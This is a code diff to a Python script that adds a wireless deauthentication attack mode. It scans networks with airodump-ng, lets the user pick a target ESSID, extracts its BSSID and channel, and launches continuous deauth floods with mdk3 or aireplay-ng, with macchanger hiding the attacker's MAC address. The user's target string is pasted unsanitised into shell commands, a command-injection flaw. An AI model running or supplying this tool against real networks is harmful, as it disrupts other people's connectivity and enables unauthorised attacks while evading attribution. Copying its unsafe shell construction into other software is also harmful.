@@ -100,6 +100,36 @@ except Exception:
    os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
    print("")
    
+   
+   print("")
+   print("List of avaliable attack mod: ")
+   print("[1] Mdk3 Deauth / Disassociation")
+   print("[2] Aireplay-ng Deauth")
+   attack = raw_input("Select one mod fo the attack: ")
+   print("")
+
+   print("Listing avaliable wireless network for attack: ")
+   os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
+
+   target = raw_input("Select one ESSID for start the attack: ")
+   os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
+   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
+   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
+   os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
+   print("")
+
+   if attack == '1':
+      print("############################# mdk3 attack! #######################################")
+      os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
+   else:
+      print("############################# Aireplay attack! ###################################")
+      os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
+      os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
+      os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
+   
+   
+   
+   
    os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
    os.system("monitor=`cat monitor.rmo` && macchanger -p $monitor")
    os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
